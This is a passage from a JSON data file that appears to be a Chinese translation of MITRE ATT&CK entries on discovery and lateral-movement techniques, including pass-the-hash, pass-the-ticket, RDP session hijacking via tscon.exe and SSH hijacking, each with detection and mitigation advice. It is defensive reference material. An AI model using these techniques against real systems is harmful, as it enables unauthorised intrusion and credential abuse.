		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统网络配置发现"
}, {
	"id": "T1049",
	"description": "<p>攻击者可能会尝试通过查询网络上的信息来获取他们所入侵系统或远程系统发起的网络连接列表。</p><p>如果获得了云化环境中一部分系统的访问权，攻击者可能会绘制虚拟私有云或虚拟网络，以确定连接了哪些系统和服务。所执行的操作可能是相同类型发现技术的相关操作，具体取决于操作系统。但是，所得到的信息可能包括攻击者目标相关网络云环境的详细信息。不同云提供商的虚拟网络运行方式可能不同。</p><p>Windows</p><p>获取此信息的实用程序和命令包括Net的netstat，net use和net session。</p><p>Mac and Linux</p><p>Mac和Linux系统中，<code>netstat</code>和<code>lsof</code>命令可用于列出当前连接。<code>who -a</code>和<code>w</code>命令可用于显示当前登录的用户，作用类似于net session。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统网络连接发现"
}, {
	"id": "T1033",
	"description": "<p>Windows</p><p>攻击者可能会尝试识别主要用户、当前登录的用户、常常使用系统的一组用户，或者某个用户是否正在积极使用该系统。他们可以用不同方法来做到这一点，比如检索账号用户名或凭据导出。攻击者也可能会使用其他发现技术以多种不同方式收集信息，因为用户和用户名详细信息在整个系统中都很普遍，并且这些信息包括运行进程的所有权、文件/目录的所有权、会话信息和系统日志。攻击者可能会使用自动发现过程中“系统所有者/用户发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p><p>Mac</p><p>Mac系统中，<code>users</code>，<code>w</code>和<code>who</code>命令可用来识别当前登录用户。</p><p>Linux</p><p>Linux系统中，<code>w</code>和<code>who</code>命令可用来识别当前登录用户。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统所有者/用户发现"
}, {
	"id": "T1007",
	"description": "<p>攻击者可能会尝试获取已注册服务的相关信息。操作系统实用程序Tasklist的sc和tasklist /svc命令以及Net的net start命令可用于获取服务信息。但是攻击者也可能会使用其他工具来获取服务信息。攻击者可能会使用自动发现过程中“系统服务发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统服务发现"
}, {
	"id": "T1124",
	"description": "<p>系统时间由Windows服务设置并保存在域内，用来维护企业网络内系统和服务之间的时间同步。</p><p>攻击者可能会从本地或远程系统收集系统时间和/或时区信息。可以通过多种方式来收集此信息，例如在Windows上使用Net命令<code>net time \\hostname</code>来收集远程系统上的系统时间信息。还可以从当前系统时间推断被攻击对象的时区，或使用<code>w32tm /tz</code>命令收集被攻击对象的时区信息。该信息可能对执行其他技术很有用，例如通过计划任务技术来执行文件，或基于时区来发现位置信息从而锁定攻击目标。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "API监控"]
	},
	"relations": {
		"detection": "<p>命令行界面监控可能会有助于检测net.exe实例或其他用于收集系统时间或时区信息的命令行实用程序。检测用于收集此信息的API调用可能不太有用，因为合法软件也可能会频繁调用它们。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统时间发现"
}, {
	"id": "T1017",
	"description": "<p>攻击者可能会使用企业管理员设置的应用程序部署系统将恶意软件部署到处于同一个网络的系统中去。此操作所需的权限因系统配置而异；本地凭据可能足以直接访问部署服务器，但也可能需要特定的域凭据。尽管如此，系统可能需要管理帐户才能登录或执行软件部署。</p><p>通过访问网络范围或企业范围的软件部署系统，攻击者能够在连接到此类系统的所有系统上执行远程代码。该访问权限可用于横向移动到各个系统，收集信息或产生特定效果，例如擦除所有端点上的硬盘驱动器。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程使用网络", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控辅助系统的应用程序部署。定期执行应用程序部署，以便凸显不规则的部署活动。监控与已知良好软件无关的进程活动。监控部署系统上的帐户登录行为。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "如果可以将应用程序部署系统配置为仅部署已签名的二进制文件，则请确保受信任的签名证书未与应用程序部署系统位于同一位置，而是位于无法远程访问或远程访问受到严格控制的系统上。"
		}, {
			"name": "多因子身份验证",
			"description": "对与应用程序部署软件一起使用的帐户使用多因子身份验证。"
		}, {
			"name": "网络分段",
			"description": "通过使用防火墙，帐户权限分离，组策略和多因子身份验证，确保关键网络系统之间的正确系统和访问隔离。"
		}, {
			"name": "特权账户管理",
			"description": "仅向有限数量的授权管理员授予对应用程序部署系统的访问权限。验证可用于访问部署系统的帐户凭据是唯一的，并且不会在整个企业网络中使用。"
		}, {
			"name": "更新软件",
			"description": "定期对部署系统打补丁，防止利用权限提升漏洞访问系统。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "应用部署软件"
}, {
	"id": "T1175",
	"description": "<p>攻击者可能会使用Windows组件对象模型（COM）和分布式组件对象模型（DCOM）在本地执行代码或是在远程系统上执行代码以便横向移动。</p><p>COM是支持软件对象交互的Windows自带API的组件，或是实现一个或多个接口的可执行代码。客户端对象可通过COM调用服务器对象的方法，通常是动态链接库（DLL）或可执行文件（EXE）。DCOM是透明中间件，它使用远程过程调用（RPC）技术将COM的功能扩展到本地计算机之外。</p><p>与本地和远程服务器COM对象进行交互的权限由注册表中的访问控制列表（ACL）指定。默认情况下，只有管理员可以通过DCOM远程激活和启动COM对象。</p><p>攻击者可能会滥用COM在本地执行命令和/或有效载荷。攻击者滥用各种公开COM接口通过各种编程语言（如C、C++、Java和VBScript）来调用任意执行。也存在特定的COM对象，可直接执行代码执行之外的功能，例如创建计划任务，无文件下载/执行，以及权限提升与持久性等其他行为。</p><p>攻击者可能会使用DCOM进行横向移动。通过DCOM，在具有适当权限的用户上下文中运行的攻击者可以通过Office应用程序以及包含不安全方法的其他Windows对象远程获取任意甚至直接的shellcode执行权限。DCOM还可以在现有文档中执行宏，也可以直接通过COM创建的Microsoft Office应用程序实例直接调用动态数据交换（DDE），而无需使用恶意文档。</p><p>DCOM还可能会暴露可以在攻击者活动链的其他区域（例如权限提升和持久性）中利用的功能。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统", "用户"],
		"dataSources": ["PowerShell日志", "API监控", "认证日志", "动态链接库监控", "网络抓包", "进程监控", "Windows注册表", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控COM对象是否加载DLL以及其它通常与应用程序无关的其他模块。通过“查询注册表”或“PowerShell”技术枚举COM对象也可能会被继续恶意使用。</p><p>监控COM对象相关进程的生成，尤其是那些非当前登录用户调用的进程。</p><p>监控分布式计算环境/远程过程调用（DCE/RPC）通信中所有的数据流入或异常增长。</p>",
		"mitigations": [{
			"name": "应用程序隔离和沙盒",
			"description": "确保启用所有COM警报和Protected View。"
		}, {
			"name": "禁用或删除功能或程序",
			"description": "考虑通过Dcomcnfg.exe禁用DCOM。"
		}, {
			"name": "网络分段",
			"description": "启用Windows防火墙，默认情况下会阻止DCOM实例化。"
		}, {
			"name": "特权账户管理",
			"description": "在HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Classes \\ AppID \\ {{AppID_GUID}}下为单独COM应用程序修改与进程范围安全性相关联的注册表设置（直接或使用Dcomcnfg.exe）。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "COM和分布式COM"
}, {
	"id": "T1210",
	"description": "<p>软件漏洞攻击指的是攻击者利用程序、服务或操作系统软件或内核本身中的编程错误执行恶意代码。入侵后对远程服务实施漏洞攻击的目的往往是横向移动从而访问远程系统。</p><p>攻击者可能需要确定远程系统是否处于易受攻击状态，方法是通过网络服务扫描技术或其它发现方法来寻找可以在网络中部署的常见易受攻击软件，查看是否有没安装的漏洞补丁，或者查看是否有可用于检测远程漏洞或本身包含远程漏洞的安全软件。对于横向移动来说服务器的利用价值可能很高，但是如果端点系统提供了优势或允许访问其他资源，则端点系统也可能处于风险之中。</p><p>常用服务（例如SMB和RDP）以及可能会在内部网络和web服务器服务中使用的应用（例如MySQL）存在几个众所周知的漏洞。</p><p>攻击者的权限也可能会在横向移动后获得提升，具体取决于易受攻击远程服务的权限级别。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows错误报告", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>软件利用检测可能很困难，具体取决于可用的工具。软件攻击可能并不会总是成功，或者可能导致被攻击的进程变得不稳定或崩溃。还要在端点系统上查找能表明攻击成功的行为，例如进程的异常行为，包括写入磁盘的可疑文件，通过进程插入来试图掩盖执行的证据，发现的证据，以及表明有其它工具传输到系统的异常网络流量。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "使用沙箱来阻止攻击者利用未发现或未修补的漏洞来实施攻击操作。也可通过其他类型的虚拟化和应用微分段来减轻某些类型漏洞攻击的影响。但在这些系统中仍可能存在其他漏洞和缺陷攻击风险。"
		}, {
			"name": "特性或程序禁用或移除",
			"description": "将可用服务数量控制在最小范围，只允许必要的服务可用。"
		}, {
			"name": "漏洞利用防护",
			"description": "可用安全应用，例如Windows Defender漏洞利用防护（WDEG）和增强缓和体验工具包（EMET），来查找漏洞攻击行为，从而缓解某些漏洞攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性，可能不适用于所有目标软件或服务。"
		}, {
			"name": "网络分区",
			"description": "适当地细分网络和系统，减少对关键系统和服务的访问。"
		}, {
			"name": "特权账号管理",
			"description": "将服务账号的权限和访问限制在最小范围，尽量降低漏洞攻击的影响。"
		}, {
			"name": "威胁情报程序",
			"description": "开发一个强大的网络威胁情报能力，用来确定哪些类型和级别的威胁可能会针对特定组织实施软件攻击和零日漏洞攻击。"
		}, {
			"name": "软件更新",
			"description": "对内部企业端点和服务器通过补丁管理来定期更新软件。"
		}, {
			"name": "漏洞扫描",
			"description": "定期扫描内部网络上的可用服务，识别新服务以及可能易受攻击的服务。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "远程服务利用"
}, {
	"id": "T1075",
	"description": "<p>认证哈希传递（PtH）是一种不访问用户明文密码而对用户进行身份认证的方法。这种方法绕过需要明文密码的步骤，直接用密码哈希来进行身份认证。在使用PtH技术时，可通过凭据访问技术获得正在使用账号的有效密码哈希。PtH使用捕捉的哈希来认证该用户身份。一旦身份认证通过，PtH可用于在本地或远程系统上执行操作。</p><p>已安装KB2871997补丁的Windows 7及更高版本需要有效域用户凭据或RID 500管理员哈希。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["认证日志"]
	},
	"relations": {
		"detection": "<p>审核所有登录和凭据使用事件，并检查是否存在差异。与其他可疑活动（例如，编写和执行二进制文件）相关的异常远程登录可能表示有恶意活动。与域登录不相关且不是匿名登录的NTLM LogonType 3身份认证是可疑的。</p>",
		"mitigations": [{
			"name": "密码策略",
			"description": "确保内置和创建的本地管理员账号有复杂且唯一的密码。"
		}, {
			"name": "特权账号管理",
			"description": "限制跨系统的凭据重叠以防止攻击者盗取凭据并降低攻击者在系统之间横向移动的能力。"
		}, {
			"name": "软件更新",
			"description": "在Windows 7和更高版本系统中安装KB2871997补丁，限制本地管理员群组中账号的默认访问。"
		}, {
			"name": "用户账号控制",
			"description": "启用PtH缓解措施来将UAC限制应用到用于登录网络的本地账号。关联的注册表项位于HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy。通过GPO来设置，路径如下：计算机配置 > [策略] > 管理模板 > SCM：认证哈希传递缓解：应用UAC限制到用于登录网络的本地账号。"
		}, {
			"name": "用户账号管理",
			"description": "不允许域用户位于多个系统上的本地管理员群组中。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "哈希传递"
}, {
	"id": "T1097",
	"description": "<p>票据传递攻击（PtT）是一种不访问账号密码而使用Kerberos凭据对用户进行身份认证的方法。Kerberos身份认证可以是横向移动到远程系统的第一步。</p><p>在使用PtT技术时，可通过凭据导出技术获取有效账号的Kerberos票据。PtT可能会获取到用户的服务票据或票据授予票据（TGT），具体取决于访问级别。服务票据允许访问特定资源，而TGT可用于从票据授予服务（TGS）请求服务票据，用来访问用户有权访问的任何资源。</p><p>PtT技术可以为使用Kerberos作为身份认证机制的服务获取白银票据，并用于生成票据来访问特定资源和承载该资源的系统（例如，SharePoint）。</p><p>PtT技术还可以使用密钥分发服务账号KRBTGT帐户NTLM哈希来获得域的黄金票据，从而为活动目录中的任一账号生成TGT。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["认证日志"]
	},
	"relations": {
		"detection": "<p>审核所有Kerberos身份认证和凭据使用事件，并检查是否存在差异。与其他可疑活动（例如，编写和执行二进制文件）相关的异常远程身份认证事件可能表示有恶意活动。</p><p>在两次重置KRBTGT密码后使用黄金票据时，在域控制器上会生成事件4769。状态代码0x1F表示由于“已解密字段完整性检查失败”而导致操作失败，也即表示先前无效的黄金票据被人滥用。</p>",
		"mitigations": [{
			"name": "活动目录配置",
			"description": "为了遏制先前生成的黄金票据的影响，请两次重置内置的KRBTGT账号密码，这会使得用KRBTGT哈希创建的任何现有黄金票据以及由此生成的其他Kerberos票据均无效。"
		}, {
			"name": "密码策略",
			"description": "确保本地管理员账号有复杂且唯一的密码。"
		}, {
			"name": "特权账号管理",
			"description": "将域管理员账号权限限制给域控制器和受限服务器。委派其他管理功能来区分账号。"
		}, {
			"name": "用户账号管理",
			"description": "不允许用户成为多个系统的本地管理员。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "票据传递"
}, {
	"id": "T1534",
	"description": "<p>攻击者可能会通过内部鱼叉式钓鱼攻击来获取其他信息的访问权，或在他们已经可以访问环境中的账户或系统之后利用同一组织内的其他用户进行攻击。内部鱼叉式钓鱼攻击是一种多阶段攻击。攻击过程中，攻击者会使用以前安装的恶意软件控制用户的设备或盗取用户的帐户凭据来占有某电子邮件帐户。攻击者试图利用可信任的内部帐户来增加诱骗目标使其陷入网络钓鱼攻击的可能性。</p><p>攻击者可能会在内部鱼叉式钓鱼攻击过程中使用附件或链接来传递有效负载或重定向到外部站点，以便在模仿电子邮件登录界面的站点上使用“输入捕捉”技术来捕获凭据。</p><p>曾发生过内部鱼叉式钓鱼攻击的显著事件。Eye Pyramid运动使用带有恶意附件的网络钓鱼电子邮件在受害者之间进行横向移动，在此过程中入侵了将近18,000个电子邮件帐户。叙利亚电子军（SEA）入侵了英国《金融时报》（FT）的电子邮件帐户，窃取其他帐户凭据。金融时报获悉该起攻击并开始警告员工该威胁后，SEA就冒充金融时报IT部门发出了网络钓鱼电子邮件，以便入侵更多用户。</p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux", "Office 365", "SaaS"],
		"permissionRequired": ["用户"],
		"dataSources": ["SSL/TLS检测", "DNS记录", "杀毒软件", "Web代理", "文件监控", "邮件服务器", "Office 365跟踪日志"]
	},
	"relations": {
		"detection": "<p>网络入侵检测系统和电子邮件网关通常不扫描内部邮件，但是组织可以利用基于日志的解决方案来发送电子邮件副本给安全服务以进行脱机分析，或者引入内部的或基于API的服务集成解决方案来帮助检测内部鱼叉式钓鱼攻击。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "内部鱼叉式钓鱼攻击"
}, {
	"id": "T1076",
	"description": "<p>远程桌面是操作系统中的常见功能。此功能允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。微软将其对远程桌面协议（RDP）的实现称为远程桌面服务（RDS）。还有其他实现和第三方工具，提供类似于RDS的图形访问远程服务。</p><p>如果启用了服务并允许使用已知凭据来访问账号，则攻击者可能会通过RDP/RDS连接到远程系统以扩展访问权限。攻击者可能会使用凭据访问技术来获取凭据并与RDP一起使用。攻击者还可能会结合使用RDP和辅助功能技术来实现持久性。</p><p>攻击者还可能实施RDP会话劫持，包括窃取合法用户的远程会话。通常，当其他人试图窃取用户会话并收到要求输入问题的提示时，会通知用户。拥有系统权限并使用终端服务控制台（<code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>）的攻击者可以劫持会话，而无需凭据或提示用户。他们可以在远程或本地劫持活动的或已断连的会话。窃取域管理员或更高权限账号的会话可能会导致远程系统发现和权限升级。所有这些都可以通过使用Windows原生命令来完成，但是它也已作为一项功能添加到了RedSnarf中。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["远程桌面用户", "用户"],
		"dataSources": ["认证日志", "Netflow/Enclave技术网络流分析", "进程监控"]
	},
	"relations": {
		"detection": "<p>RDP的使用可能是合法的，具体取决于网络环境及其使用方式。其他因素，例如远程登录后的访问模式和活动，可能表示有RDP相关的可疑或恶意行为。监控是否有用户账号登录他们通常不会访问的系统，或监控在相对较短时间内登录多个系统所用的访问模式。</p><p>另外，监控<code>tscon.exe</code>进程的使用，并监控使用<code>cmd.exe /k</code>或<code>cmd.exe /c</code>参数来防止RDP会话劫持的服务创建活动。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "定期审核“远程桌面用户群组”成员身份。从“远程桌面用户群组”中删除不必要的账号和群组。"
		}, {
			"name": "特性或程序禁用或移除",
			"description": "如果不需要，请禁用RDP服务。"
		}, {
			"name": "网络资源访问限制",
			"description": "使用远程桌面网关。"
		}, {
			"name": "多因子认证",
			"description": "对远程登录使用多因子身份认证。"
		}, {
			"name": "网络分区",
			"description": "不允许从Internet访问RDP。启用防火墙规则来阻止网络内安全区域之间的RDP通信。"
		}, {
			"name": "操作系统配置",
			"description": "更改GPO设置来定义更短的超时会话以及任何单个会话可以处于活动状态的最长时间。更改GPO设置来指定已断连会话在RD会话主机服务器上保持活动状态的最长时间。"
		}, {
			"name": "特权账号管理",
			"description": "考虑从允许通过RDP登录的群组列表中删除本地管理员群组。"
		}, {
			"name": "用户账号管理",
			"description": "如果需要远程访问，请限制远程用户权限。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "远程桌面协议"
}, {
	"id": "T1105",
	"description": "<p>攻击者可能会将文件从一个系统复制到另外一个系统，以便在操作过程中使用他们自己的工具或文件。攻击者可能会通过命令与控制通道或者通过其它协议工具（如FTP）从外部他们自己控制的系统中拷贝文件，从而将他们的工具放置到所攻击的网络中。攻击者还可能会使用Mac或Linux自带工具scp，rsync和sftp等来复制文件。</p><p>攻击者还可能会通过远程执行（使用系统固有的文件共享协议，比如SMB文件共享）或已认证的连接（使用Windows管理员共享或远程桌面协议）在内部已攻击系统之间横向复制文件，从而支持横向移动。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "网络抓包", "网络进程使用", "Netflow/Enclave技术网络流分析", "网络协议分析", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控文件创建和通过SMB在网络内传输的文件。与外网连接的异常进程在系统上创建文件是可疑的。使用通常不会使用的实用程序（例如FTP）也可能是可疑的。</p><p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量或异常数据传输（通过已知工具和协议，如FTP）的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定混淆技术，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C2签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011", "TA0008"]
	},
	"name": "远程文件复制"
}, {
	"id": "T1021",
	"description": "<p>攻击者可能会使用有效账号登录专门用于接受远程连接的服务，例如telnet，SSH和VNC。然后，攻击者可能会以登录用户身份执行操作。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["认证日志"]
	},
	"relations": {
		"detection": "<p>找出远程服务相关的登录活动与异常行为或其他恶意或可疑活动之间的关系。攻击者可能需要在尝试横向移动之前通过发现技术来了解环境和系统之间的关系。</p>",
		"mitigations": [{
			"name": "多因子认证",
			"description": "尽可能在远程服务登录上使用多因子身份认证。"
		}, {
			"name": "用户账号管理",
			"description": "限制可能使用远程服务的账号。限制有较高攻击风险账号的权限；例如，配置SSH使得用户只能运行特定程序。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "远程服务"
}, {
	"id": "T1051",
	"description": "<p>攻击者可能会通过包含网站webroot或web内容目录的开放网络文件共享将恶意内容添加到内部可访问的网站，然后使用web浏览器浏览到该内容，从而使服务器执行恶意内容。恶意内容往往在web服务器进程的上下文和权限下运行，通常会导致本地系统或管理权限，具体取决于web服务器的配置方式。</p><p>这种共享访问和远程执行机制可用于横向移动到运行web服务器的系统。例如，运行带有开放网络共享的PHP的web服务器可能允许攻击者上传远程访问工具和PHP脚本，以便访问特定页面时在运行web服务器的系统上执行RAT。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>通过文件和进程监控来检测何时文件是由非正常web服务器进程写入web服务器的，或者何时文件是在正常管理时间段之外写入的。通过进程监控来识别在web服务器上运行的正常进程，并检测通常不执行的进程。</p>",
		"mitigations": [{
			"name": "限制通过网络对资源的访问",
			"description": "禁止远程访问用于提供web内容的webroot或其他目录。"
		}, {
			"name": "网络分段",
			"description": "如果系统和web服务器未得到适当保护以限制未经身份验证的网络共享访问和网络/系统隔离，那么允许开放式开发和测试web内容并允许用户在企业网络上设置自己的web服务器的网络可能特别容易受到攻击。"
		}, {
			"name": "特权账户管理",
			"description": "如果系统和web服务器没有得到适当保护以限制特权帐户的使用和未经身份验证的网络共享访问，那么允许开放式开发和测试web内容并允许用户在企业网络上设置自己的web服务器的网络可能特别容易受到攻击。"
		}, {
			"name": "文件和目录权限限制",
			"description": "禁止在webroot内的目录上执行。确保对可通过web服务器访问的目录具有适当的权限。"
		}, {
			"name": "用户帐户管理",
			"description": "确保web服务器进程的权限仅是不使用内置帐户所需的权限；相反，创建特定帐户以限制不必要的访问或多个系统中的权限重叠。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "共享Webroot"
}, {
	"id": "T1184",
	"description": "<p>Secure Shell（SSH）是Linux和macOS系统上的标准远程访问方式。SSH允许用户通过加密隧道连接到另一个系统，通常通过密码、证书或使用非对称加密密钥对进行身份验证。</p><p>为了从受感染的主机横向移动，攻击者可以通过劫持与另一个系统的现有连接来利用活动SSH会话中通过公钥认证与其他系统建立的信任关系。这可能是通过破坏SSH代理本身或通过访问代理的套接字来实现。如果攻击者能够获得root访问权限，那么劫持SSH会话可能很简单。还可通过破坏SSH代理来拦截SSH凭据。</p><p>SSH劫持与使用远程服务不同，因为它会注入到现有的SSH会话中，而不是使用有效帐户创建新会话。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户", "root用户"],
		"dataSources": ["认证日志"]
	},
	"relations": {
		"detection": "<p>使用SSH可能是合法的，具体取决于网络环境及其使用方式。其他因素（例如，访问模式以及远程登录后发生的活动）可能表示有使用SSH的可疑或恶意行为。监控用户帐户登录到他们通常不会访问的系统或在相对较短的时间内访问多个系统的模式。还可以监控不同用户使用的用户SSH代理套接字文件。</p>",
		"mitigations": [{
			"name": "禁用或删除功能或程序",
			"description": "确保在未明确要求此功能的系统上禁用代理转发以防止滥用。"
		}, {
			"name": "密码策略",
			"description": "确保SSH密钥对具有强密码，并且不使用密钥存储技术（如ssh-agent），除非它们受到适当保护。"
		}, {
			"name": "特权账户管理",
			"description": "不允许以root身份或其他特权帐户通过SSH进行远程访问。"
		}, {
			"name": "文件和目录权限限制",
			"description": "确保设置了适当的文件权限并强化系统，防止root权限升级机会。"
		}, {
			"name": "用户帐户控制",
			"description": "确保所有私钥都安全地存储在只有合法所有者才能使用强密码访问并经常轮换的位置。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "SSH劫持"
}, {
	"id": "T1080",
	"description": "<p>存储在网络驱动器或其他共享位置的内容可能会被恶意程序，脚本或攻击代码添加到其他有效文件中而受到污染。一旦用户打开共享的受污染内容，就会执行恶意部分以在远程系统上运行攻击者的代码。攻击者可能会使用受污染的共享内容来横向移动。</p><p>目录共享数据透视是此技术的一种变体，它使用其他几种技术在用户访问共享网络目录时传播恶意软件。它对目录.LNK文件使用“快捷方式修改”技术从而伪装成真实的目录，并使用“隐藏文件和目录”技术来隐藏这些目录。基于恶意.LNK的目录含有嵌入式命令，该命令在目录中执行隐藏的恶意软件文件，然后打开实际的目标目录，以便用户仍然可以执行预期的操作。当与经常使用的网络目录一起使用时，该技术可能导致频繁的重新感染和对系统的广泛访问，并可能导致对新的和更高特权帐户的广泛访问。</p><p>攻击者还可能通过感染二进制文件的方式来入侵共享网络目录，方法是将其代码附加或预处理到共享网络目录上的健康二进制文件中。恶意软件可能会修改健康二进制文件的原始入口点（OEP），以确保其在合法代码之前执行。由远程系统执行时，可能会继续通过新感染的文件扩大感染范围。这些感染可能是针对以特定文件扩展名结尾的二进展和非二进制文件，包括但不限于.exe, .dll, .scr, .bat和.vbs。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>将许多文件写入或覆盖到网络共享目录的进程可能是可疑的。监控从可移动媒体执行的进程，查看是否有恶意或异常活动，例如由命令与控制服务器以及可能由网络发现技术而导致的网络连接。</p><p>经常扫描共享网络目录中的恶意文件，隐藏文件，.LNK文件以及在用于共享特定类型内容的目录中不常见的其他文件类型。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "识别可能用于污染内容或可能由此产生的潜在恶意软件，并在适当情况下使用白名单工具（如AppLocker或软件限制策略）审核和/或阻止未知程序。"
		}, {
			"name": "漏洞利用保护",
			"description": "使用可检测或减轻利用常用功能的实用程序，例如Microsoft增强型缓解体验工具包（EMET）。"
		}, {
			"name": "文件和目录权限限制",
			"description": "控制具有写访问权限的用户数量来保护共享文件。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "共享内容污点"
}, {
	"id": "T1077",
	"description": "<p>Windows系统中有管理员才能访问的隐藏网络共享（比如，<code>C$</code>，<code>ADMIN$</code>和<code>IPC$</code>），并提供了远程文件复制和其他管理功能。</p><p>攻击者可能会将此技术与管理员级别的有效账号相结合通过SMB远程访问联网系统,从而通过远程过程调用（RPC）来与系统交互，传输文件，并通过远程执行来运行二进制文件。</p><p>依赖SMB/RPC上已认证会话的技术包括计划任务，服务执行和WMI管理指令集。攻击者还可能会使用NTLM哈希在某配置或补丁级别通过PtH技术来访问系统上的管理员共享。</p><p>Net实用程序的<code>net use</code>命令可与有效凭据一起使用，来访问远程系统上的Windows管理员共享。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
